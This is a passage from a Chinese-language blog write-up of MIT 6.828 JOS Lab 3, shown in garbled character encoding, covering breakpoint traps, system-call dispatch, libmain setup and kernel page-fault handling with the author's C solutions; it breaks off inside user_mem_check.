ä½¿å¾—æ–­ç‚¹å¼‚å¸¸èƒ½å”¤èµ·ä¸€ä¸ª kernel monitor</p><blockquote><p><strong>Exercise 6.</strong> Modify <code>trap_dispatch()</code> to make breakpoint exceptions invoke the kernel monitor. You should now be able to get make grade to succeed on the <code>breakpoint</code> test.</p></blockquote><p>ç®€å•ä¿®æ”¹ä¸€ä¸‹ä¹‹å‰çš„å¤§ switch å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line">monitor(tf);</span><br><span class="line"><span class="keyword">return</span> ;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åº”è¯¥èƒ½é€šè¿‡ grade ä¸­çš„æ–­ç‚¹è¯„åˆ†</p><p><img src="https://s2.loli.net/2022/03/17/sJYUfEvIPtBrdFo.png" alt="image.png"></p><p>æ¥ä¸‹æ¥åˆæ˜¯ Challengeï¼Œå®Œæˆå•æ­¥è°ƒè¯•å™¨ï¼š</p><blockquote><p><em>Challenge!</em> Modify the JOS kernel monitor so that you can â€˜continueâ€™ execution from the current location (e.g., after the <code>int3</code>, if the kernel monitor was invoked via the breakpoint exception), and so that you can single-step one instruction at a time. You will need to understand certain bits of the <code>EFLAGS</code> register in order to implement single-stepping.</p><p><em>Optional:</em> If youâ€™re feeling really adventurous, find some x86 disassembler source code - e.g., by ripping it out of QEMU, or out of GNU binutils, or just write it yourself - and extend the JOS kernel monitor to be able to disassemble and display instructions as you are stepping through them. Combined with the symbol table loading from lab 1, this is the stuff of which real kernel debuggers are made.</p></blockquote><p><del>é—²å‡ºå±æ¥æ‰æœ‰æ—¶é—´å»åšè¿™ç©æ„ï¼ŒğŸ‘´å¿™ç€å‘¢</del></p><p>ä¹‹åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Questions</strong></p><ol><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>è¿™å–å†³äº IDT ä¸­é—¨æè¿°ç¬¦çš„ç‰¹æƒçº§ï¼Œè‹¥ç‰¹æƒçº§ä¸º 0 ï¼Œç”¨æˆ·è¿›ç¨‹æ²¡æœ‰æƒé™è®¿é—®å¯¹åº”é¡µé¢ï¼Œè‡ªç„¶ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼›è‹¥ç‰¹æƒçº§ä¸º3ï¼Œåˆ™è‡ªç„¶èƒ½æ­£å¸¸é€šè¿‡é—¨æè¿°ç¬¦è§¦å‘æ–­ç‚¹å¼‚å¸¸ã€‚</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>ç›®çš„æ˜¯ä¸å…è®¸ç”¨æˆ·éšæ„é€šè¿‡é—¨æè¿°ç¬¦è¿›å…¥ä¸è¯¥è¿›å…¥çš„å¤„ç†ç¨‹åºä¸­</p></li></ol></blockquote><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>ç”¨æˆ·è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨å‘å†…æ ¸è¯·æ±‚èµ„æºï¼Œå½“ç”¨æˆ·è¿›ç¨‹è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¤„ç†å™¨è¿›å…¥å†…æ ¸æ€ï¼Œä¿å­˜ç”¨æˆ·è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¹‹åå†…æ ¸æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ä»£ç ï¼Œæœ€åæ¢å¤å›ç”¨æˆ·è¿›ç¨‹</p><p>åœ¨ JOS ä¸­æˆ‘ä»¬ä½¿ç”¨ <code>int 0x30</code> æ¥å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œè¿›ç¨‹é€šè¿‡å¯¹åº”çš„å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼ˆeaxï¼‰ä¸å‚æ•°ï¼ˆedxï¼Œecxï¼Œebxï¼Œediï¼Œesiï¼‰ï¼Œè¿”å›å€¼å­˜æ”¾åœ¨ rax å¯„å­˜å™¨ä¸­</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 7ï¼Œè¡¥å®Œ JOS çš„ç³»ç»Ÿè°ƒç”¨æœºåˆ¶</p><blockquote><p><strong>Exercise 7.</strong> Add a handler in the kernel for interrupt vector <code>T_SYSCALL</code>. You will have to edit <code>kern/trapentry.S</code> and <code>kern/trap.c</code>â€˜s <code>trap_init()</code>. You also need to change <code>trap_dispatch()</code> to handle the system call interrupt by calling <code>syscall()</code> (defined in <code>kern/syscall.c</code>) with the appropriate arguments, and then arranging for the return value to be passed back to the user process in <code>%eax</code>. Finally, you need to implement <code>syscall()</code> in <code>kern/syscall.c</code>. Make sure <code>syscall()</code> returns <code>-E_INVAL</code> if the system call number is invalid. You should read and understand <code>lib/syscall.c</code> (especially the inline assembly routine) in order to confirm your understanding of the system call interface. Handle all the system calls listed in <code>inc/syscall.h</code> by invoking the corresponding kernel function for each call.</p><p>Run the <code>user/hello</code> program under your kernel (make run-hello). It should print â€œ<code>hello, world</code>â€œ on the console and then cause a page fault in user mode. If this does not happen, it probably means your system call handler isnâ€™t quite right. You should also now be able to get make grade to succeed on the <code>testbss</code> test.</p></blockquote><p>é¦–å…ˆæ˜¯åœ¨å¤§ switch é‡Œè°ƒç”¨ JOS çš„ syscall æ¥å£ï¼Œè¿™é‡Œ<strong>åˆ«å¿˜äº†æ˜¾å¼åœ°å°†è¿”å›å€¼ç»™åˆ° eax</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_SYSCALL:</span><br><span class="line">tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, </span><br><span class="line">tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx, </span><br><span class="line">tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, </span><br><span class="line">tf-&gt;tf_regs.reg_esi);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>ä¹‹åä¿®æ”¹ <code>kern/syscall.c</code> ä¸­çš„ <code>syscall()</code> å‡½æ•°ï¼Œç¬”è€…æœ¬æƒ³é€‰æ‹©å£°æ˜ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œåœ¨è¿›è¡Œè°ƒç”¨æ—¶ç›´æ¥æŸ¥è¡¨è°ƒç”¨å³å¯ï¼Œä½†æ˜¯ JOS å·²ç»å†™äº†ä¸€ä¸ª switch åœ¨è¿™é‡Œï¼Œé‚£å°±ä¸€åˆ‡ä»ç®€å§ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatches to the correct kernel function, passing the arguments.</span></span><br><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">uint32_t</span> syscallno, <span class="type">uint32_t</span> a1, <span class="type">uint32_t</span> a2, <span class="type">uint32_t</span> a3, <span class="type">uint32_t</span> a4, <span class="type">uint32_t</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> SYS_cputs:</span><br><span class="line">sys_cputs((<span class="type">const</span> <span class="type">char</span>*)a1, a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_cgetc:</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> SYS_getenvid:</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> SYS_env_destroy:</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæˆä¹‹ååº”å½“èƒ½é€šè¿‡ grade é‡Œçš„ testbssï¼š</p><p><img src="https://s2.loli.net/2022/03/17/qseB1tyViWIrdDG.png" alt="image.png"></p><p>ä¹‹åæ˜¯ Challengeï¼Œä¿®æ”¹ä»£ç ä½¿ç”¨ sysenter ä¸ sysexit å®ç°ç³»ç»Ÿè°ƒç”¨æœºåˆ¶</p><blockquote><p><em>hallenge!</em> Implement system calls using the <code>sysenter</code> and <code>sysexit</code> instructions instead of using <code>int 0x30</code> and <code>iret</code>.</p><p>The <code>sysenter/sysexit</code> instructions were designed by Intel to be faster than <code>int/iret</code>. They do this by using registers instead of the stack and by making assumptions about how the segmentation registers are used. The exact details of these instructions can be found in Volume 2B of the Intel reference manuals.</p><p>The easiest way to add support for these instructions in JOS is to add a <code>sysenter_handler</code> in <code>kern/trapentry.S</code> that saves enough information about the user environment to return to it, sets up the kernel environment, pushes the arguments to <code>syscall()</code> and calls <code>syscall()</code> directly. Once <code>syscall()</code> returns, set everything up for and execute the <code>sysexit</code> instruction. You will also need to add code to <code>kern/init.c</code> to set up the necessary model specific registers (MSRs). Section 6.1.2 in Volume 2 of the AMD Architecture Programmerâ€™s Manual and the reference on SYSENTER in Volume 2B of the Intel reference manuals give good descriptions of the relevant MSRs. You can find an implementation of <code>wrmsr</code> to add to <code>inc/x86.h</code> for writing to these MSRs <a href="http://ftp.kh.edu.tw/Linux/SuSE/people/garloff/linux/k6mod.c">here</a>.</p><p>Finally, <code>lib/syscall.c</code> must be changed to support making a system call with <code>sysenter</code>. Here is a possible register layout for the <code>sysenter</code> instruction:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eax                - syscall number</span><br><span class="line">edx, ecx, ebx, edi - arg1, arg2, arg3, arg4</span><br><span class="line">esi                - return pc</span><br><span class="line">ebp                - return esp</span><br><span class="line">esp                - trashed by sysenter</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GCCâ€™s inline assembler will automatically save registers that you tell it to load values directly into. Donâ€™t forget to either save (push) and restore (pop) other registers that you clobber, or tell the inline assembler that youâ€™re clobbering them. The inline assembler doesnâ€™t support saving <code>%ebp</code>, so you will need to add code to save and restore it yourself. The return address can be put into <code>%esi</code> by using an instruction like <code>leal after_sysenter_label, %%esi</code>.</p><p>Note that this only supports 4 arguments, so you will need to leave the old method of doing system calls around to support 5 argument system calls. Furthermore, because this fast path doesnâ€™t update the current environmentâ€™s trap frame, it wonâ€™t be suitable for some of the system calls we add in later labs.</p><p>You may have to revisit your code once we enable asynchronous interrupts in the next lab. Specifically, youâ€™ll need to enable interrupts when returning to the user process, which <code>sysexit</code> doesnâ€™t do for you.</p></blockquote><p><del>æ²¡é‚£é—²å·¥å¤«ï¼ŒğŸ‘´é€‰æ‹©æ‘¸äº†</del></p><h3 id="User-mode-startup"><a href="#User-mode-startup" class="headerlink" title="User-mode startup"></a>User-mode startup</h3><p>ç”¨æˆ·è¿›ç¨‹çš„å…¥å£ç‚¹åœ¨ <code>lib/entry.S</code>ï¼Œå…¶åœ¨åˆå§‹åŒ–åä¼šè°ƒç”¨ <code>libmain()</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦ä¿®æ”¹è¯¥å‡½æ•°ï¼šå°†å…¨å±€å˜é‡ <code>thisenv</code> æŒ‡å‘å½“å‰è¿›ç¨‹çš„ Env ç»“æ„ä½“</p><p><code>libmain()</code> ä¹‹åä¼šè°ƒç”¨ <code>umain()</code>ï¼Œå®šä¹‰äº <code>user/hello.c</code> ä¸­ï¼Œåœ¨æ‰“å° hello world ä¹‹åå…¶ä¼šå°è¯•è®¿é—® <code>thisenv-&gt;env_id</code>ï¼Œåœ¨ä¹‹å‰çš„å®éªŒä¸­è¿™ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åº”å½“åˆå§‹åŒ– <code>thisenv</code> ä»¥è®©ä»–ä¸è§¦å‘å¼‚å¸¸</p><p>äºæ˜¯æˆ‘ä»¬æ¥åˆ°äº† Exercise 8ï¼Œ<strong>è¿›å…¥åˆ°ç”¨æˆ·æ€çš„ä¸–ç•Œ</strong>ï¼ˆå…¶å®ç³»ç»Ÿè°ƒç”¨é‚£é‡Œå·²ç»åœ¨ç”¨æˆ·æ€ä¸å†…æ ¸æ€â€œæ¥å»ä¹‹é—´â€äº†ï¼‰</p><blockquote><p><strong>Exercise 8.</strong> Add the required code to the user library, then boot your kernel. You should see <code>user/hello</code> print â€œ<code>hello, world</code>â€œ and then print â€œ<code>i am environment 00001000</code>â€œ. <code>user/hello</code> then attempts to â€œexitâ€ by calling <code>sys_env_destroy()</code> (see <code>lib/libmain.c</code> and <code>lib/exit.c</code>). Since the kernel currently only supports one user environment, it should report that it has destroyed the only environment and then drop into the kernel monitor. You should be able to get make grade to succeed on the <code>hello</code> test.</p></blockquote><p>è·å–åˆ°è¿›ç¨‹ id åéå† envs æ•°ç»„å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">libmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// set thisenv to point at our Env structure in envs[].</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">int</span> env_id;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"></span><br><span class="line">env_id = sys_getenvid();</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NENV; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (envs[i].env_id == env_id)</span><br><span class="line">&#123;</span><br><span class="line">thisenv = &amp;envs[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// thisenv = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// save the name of the program so that panic() can use it</span></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">0</span>)</span><br><span class="line">binaryname = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// call user main routine</span></span><br><span class="line">umain(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exit gracefully</span></span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ—¶è¿è¡Œè¯„åˆ†ç¨‹åºåº”å½“èƒ½é€šè¿‡ helloï¼š</p><p><img src="https://s2.loli.net/2022/03/17/nUNeugYvxTH7p5b.png" alt="image.png"></p><h3 id="Page-faults-and-memory-protection"><a href="#Page-faults-and-memory-protection" class="headerlink" title="Page faults and memory protection"></a>Page faults and memory protection</h3><p>OS é€šå¸¸ä¾èµ–äºç¡¬ä»¶ä»¥ä¿æŠ¤å†…å­˜ï¼Œå½“ä¸€ä¸ªç¨‹åºå°è¯•è®¿é—®éæ³•åœ°å€æˆ–æ— æƒé™åœ°å€æ—¶å¤„ç†å™¨ä¼šåœæ­¢è¿›ç¨‹è¿è¡Œï¼Œå¹¶å¸¦ç€é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤ä¿¡æ¯é™·å…¥å†…æ ¸ï¼Œè‹¥è¯¥å¼‚å¸¸å¯ä»¥è¢«ä¿®å¤åˆ™å†…æ ¸å°†å…¶ä¿®å¤åå†è®©ç¨‹åºç»§ç»­è¿è¡Œï¼Œå¦åˆ™ä¼šç»ˆæ­¢ç¨‹åºè¿è¡Œ</p><p>ä¸€ä¸ªå¯ä»¥è¢«ä¿®å¤çš„å¼‚å¸¸çš„èŒƒä¾‹ä¾¿æ˜¯æ ˆçš„å¢é•¿ï¼Œåœ¨åˆå§‹æ—¶æˆ‘ä»¬ä»…ä¸ºç”¨æˆ·è¿›ç¨‹æ ˆåˆ†é…äº†ä¸€å¼ é¡µï¼Œå½“æ ˆçªç ´ä¸€å¼ é¡µçš„å¤§å°æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶å†…æ ¸åº”å½“è‡ªåŠ¨åˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜é¡µåˆ°è¯¥å¤„ï¼Œå¹¶è®©ç¨‹åºç»§ç»­è¿è¡Œ</p><p>ç³»ç»Ÿè°ƒç”¨åŒæ ·å¯ä»¥åœ¨å†…å­˜ä¿æŠ¤ä¸Šé€ æˆé—®é¢˜ï¼šå¤§éƒ¨åˆ†çš„ç³»ç»Ÿè°ƒç”¨æ¥å£éƒ½ä¼šè®©ç”¨æˆ·ç¨‹åºå‘å†…æ ¸ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆï¼Œè€Œå†…æ ¸éœ€è¦è§£å¼•ç”¨è¿™äº›æŒ‡é’ˆï¼Œè¿™ä¾¿ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜â€œ</p><ul><li>å†…æ ¸ç©ºé—´ä¸­çš„ç¼ºé¡µå¼‚å¸¸æ¯”ç”¨æˆ·ç©ºé—´ä¸­çš„ç¼ºé¡µå¼‚å¸¸è¦ä¸¥é‡å¾—å¤šï¼Œè‹¥å†…æ ¸åœ¨æ“çºµè‡ªå·±çš„æ•°æ®ç»“æ„æ—¶å‡ºç°ç¼ºé¡µå¼‚å¸¸ï¼Œé‚£å°±æ˜¯ kernel bugï¼Œåº”å½“å¼•èµ· kernel panicï¼Œä½†è‹¥è¿™äº›æŒ‡é’ˆæ¥è‡ªäºç”¨æˆ·è¿›ç¨‹ï¼Œåˆ™åº”å½“è¦æ ‡è¯†å‡ºè¿™ç¼ºé¡µå¼‚å¸¸æ˜¯ä»£è¡¨ç”¨æˆ·è¿›ç¨‹çš„</li><li>å†…æ ¸æœ‰ç€é«˜äºç”¨æˆ·è¿›ç¨‹çš„æƒé™ï¼Œå› æ­¤ç”¨æˆ·ç¨‹åºå¯èƒ½ä¼šä¼ é€’ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·ä¸å¯è¯»å†™ä½†æ˜¯å†…æ ¸å¯è¯»å†™çš„åŒºåŸŸï¼Œè¿™ä¹Ÿæ˜¯å†…æ ¸éœ€è¦æ³¨æ„çš„</li></ul><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªåœ°å€æ£€æŸ¥çš„åŠŸèƒ½ï¼Œå†…æ ¸éœ€è¦ç”¨å…¶æ¥æ£€æŸ¥ç”¨æˆ·ç¨‹åºä¼ å…¥çš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç”¨æˆ·ç©ºé—´ï¼Œä»¥åŠé¡µè¡¨æ˜¯å¦å…è®¸ç›¸å…³æ“ä½œ</p><p>ä»¥æ­¤ï¼Œå†…æ ¸æ°¸è¿œä¸ä¼šå› ä¸ºè§£å¼•ç”¨ç”¨æˆ·æä¾›çš„æŒ‡é’ˆè€Œé€ æˆç¼ºé¡µå¼‚å¸¸ï¼Œè‹¥å†…æ ¸å‘ç”Ÿäº†ç¼ºé¡µå¼‚å¸¸ï¼Œåˆ™åº”å½“ panicâ€”â€”è¿™å°±æ˜¯æ¥ä¸‹æ¥çš„ Exercise 9ï¼Œä¿®æ”¹ <code>kern/trap.c</code> è®©å†…æ ¸æ€ä¸‹å‘ç”Ÿçš„ç¼ºé¡µå¼‚å¸¸é€ æˆ kernel panic</p><blockquote><p><strong>Exercise 9.</strong> Change <code>kern/trap.c</code> to panic if a page fault happens in kernel mode.</p><p>Hint: to determine whether a fault happened in user mode or in kernel mode, check the low bits of the <code>tf_cs</code>.</p><p>Read <code>user_mem_assert</code> in <code>kern/pmap.c</code> and implement <code>user_mem_check</code> in that same file.</p><p>Change <code>kern/syscall.c</code> to sanity check arguments to system calls.</p><p>Boot your kernel, running <code>user/buggyhello</code>. The environment should be destroyed, and the kernel should <em>not</em> panic. You should see:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[00001000] user_mem_check assertion failure for va 00000001</span><br><span class="line">[00001000] free env 00001000</span><br><span class="line">Destroyed the only environment - nothing more to do!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Finally, change <code>debuginfo_eip</code> in <code>kern/kdebug.c</code> to call <code>user_mem_check</code> on <code>usd</code>, <code>stabs</code>, and <code>stabstr</code>. If you now run <code>user/breakpoint</code>, you should be able to run backtrace from the kernel monitor and see the backtrace traverse into <code>lib/libmain.c</code> before the kernel panics with a page fault. What causes this page fault? You donâ€™t need to fix it, but you should understand why it happens.</p></blockquote><p>é¦–å…ˆæ˜¯ä¿®æ”¹ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œè‹¥æˆ‘ä»¬éœ€è¦ç¡®å®šä¸€ä¸ªç¼ºé¡µå¼‚å¸¸å‘ç”Ÿåœ¨ç”¨æˆ·æ€è¿˜æ˜¯å†…æ ¸æ€ï¼Œåªéœ€è¦æ£€æŸ¥ Trapframe ä¸­ cs æ®µå¯„å­˜å™¨çš„ RPL ä½å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_fault_handler</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether it happened in kernel mode or not</span></span><br><span class="line"><span class="keyword">if</span> (!(tf-&gt;tf_cs &amp; <span class="number">0b11</span>))</span><br><span class="line">panic(<span class="string">&quot;kernel page fault!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="user-mem-check-ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§"><a href="#user-mem-check-ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§" class="headerlink" title="user_mem_check()ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§"></a>user_mem_check()ï¼šæ£€æŸ¥ç”¨æˆ·åœ°å€åˆæ³•æ€§</h4><p>æœ€åæ˜¯ä¿®æ”¹ <code>user_mem_check()</code>ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>æ£€æŸ¥åœ°å€æ˜¯å¦è½åœ¨ç”¨æˆ·ç©ºé—´</li><li>æ£€æŸ¥é¡µè¡¨é¡¹ï¼Œç”¨æˆ·æ˜¯å¦æœ‰ç›¸åº”æƒé™</li></ul><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¯èƒ½å‘ç”Ÿçš„æ•´å‹æº¢å‡ºå¯¼è‡´çš„åœ°å€å›ç»•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Check that an environment is allowed to access the range of memory</span></span><br><span class="line"><span class="comment">// [va, va+len) with permissions &#x27;perm | PTE_P&#x27;.</span></span><br><span class="line"><span class="comment">// Normally &#x27;perm&#x27; will contain PTE_U at least, but this is not required.</span></span><br><span class="line"><span class="comment">// &#x27;va&#x27; and &#x27;len&#x27; need not be page-aligned; you must test every page that</span></span><br><span class="line"><span class="comment">// contains any of that range.  You will test either &#x27;len/PGSIZE&#x27;,</span></span><br><span class="line"><span class="comment">// &#x27;len/PGSIZE + 1&#x27;, or &#x27;len/PGSIZE + 2&#x27; pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A user program can access a virtual address if (1) the address is below</span></span><br><span class="line"><span class="comment">// ULIM, and (2) the page table gives it permission.  These are exactly</span></span><br><span class="line"><span class="comment">// the tests you should implement here.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If there is an error, set the &#x27;user_mem_check_addr&#x27; variable to the first</span></span><br><span class="line"><span class="comment">// erroneous virtual address.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 if the user program can access this range of addresses,</span></span><br><span class="line"><span class="comment">// and -E_FAULT otherwise.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">user_mem_check</span><span class="params">(<span class="keyword">struct</span> Env *env, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">size_t</span> len, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> start, end;</span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">start = ((<span class="type">uint32_t</span>) va) &amp; (~(PGSIZE - <span class="number">1</span>));</span><br><span class="line">end = ROUNDUP(((<span class="type">uint32_t</span>) va) + len, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; start &lt; end; start += PGSIZE)</span><br><span 